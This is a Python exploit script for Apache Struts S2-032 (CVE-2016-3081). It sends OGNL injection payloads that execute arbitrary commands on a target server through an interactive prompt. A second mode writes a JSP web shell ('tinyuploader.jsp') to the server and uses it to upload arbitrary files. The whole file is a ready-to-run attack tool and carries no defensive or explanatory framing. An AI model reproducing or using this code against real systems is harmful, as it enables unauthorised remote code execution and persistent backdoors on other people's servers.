#coding=utf-8

import requests
import argparse
import re

'''
author:wanger@wooyun.org
'''

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
upload_cut = re.compile(r'.*?//.*?/')
 
def command(cmdstr,url):
    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" +cmdstr + "&pp=\\A&ppp=%20&encoding=UTF-8"
    cmdurl = url + payload
    try:
        res = requests.get(cmdurl,headers = headers)
        if res.status_code == 200:
            print res.content
        else:
            print "RCE Failed!\n"
            exit()
    except Exception,e:
        print e
        exit()
        print "RCE Failed!\n"

def fileupload(url,filename,shellname):
    cut = upload_cut.search(url)
    if cut:
        root = cut.group()
    else:
        print "Illegal URL!\n"
        exit()
    remain = url.replace(root,'')
    childs = remain.split('/')
    del childs[-1]
    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=tinyuploader.jsp&shellContent=%3C%25@page%20import%3D%22java.io.%2a%22%25%3E%3C%25if%28request.getParameter%28%22f%22%29%21%3Dnull%29%7BFileOutputStream%20os%3Dnew%20FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22f%22%29%29%3BInputStream%20is%3Drequest.getInputStream%28%29%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3Bint%20n%3Bwhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dos.close%28%29%3Bis.close%28%29%3B%7D%25%3E&encoding=UTF-8&pp=%2f"
    up_url = url + payload
    try:
        res = requests.get(up_url,headers = headers)
        if res.status_code == 200:
            path = ''
            realpath = ''
            for child in childs:
                path = path + child + '/'
                res_try = requests.get(root+path+'tinyuploader.jsp',headers = headers)
                if res_try.status_code == 200:
                    realpath = path
                    break
            data = open(filename,'r').read()
            #print data
            respost = requests.get(root+realpath+'tinyuploader.jsp?f='+shellname,data = data,headers =headers)
            if respost.status_code == 200:
                print "File upload success!\n"+ root + realpath + shellname
            else:
                print "File upload failed!\n"
                exit()
    except Exception,e:
        print e
        print "File upload failed!\n"
        exit()

def main():
    parser = argparse.ArgumentParser(prog='s2-032_all.py',description='CVE-2016-3081 | Apache Struts S2-032')
    parser.add_argument('--cmd', dest='CMD', action='store_true', help='drop into shell-like RCE')
    parser.add_argument('--url', dest='URL', help='specifiy the url of the target')
    parser.add_argument('-f', dest='FILENAME', help='specifiy loacl filename of the file you want to upload')
    parser.add_argument('-d', dest='SHELLNAME', help='specifiy remote filename upload on the server')
    args = parser.parse_args()
    
    if args.CMD and args.URL:
        loop = 1
        while loop == 1:
            cmdstr = raw_input('# ')
            while cmdstr.strip() == '':
                cmdstr = raw_input('# ')
            if cmdstr.strip() == '\q':
                print 'Bye!'
                exit()
            command(cmdstr,args.URL)
    
    elif args.URL and args.FILENAME and args.SHELLNAME:
        fileupload(args.URL,args.FILENAME,args.SHELLNAME)
        
    else:
        print parser.print_help()
    
if __name__ == "__main__":
    main()                
            
               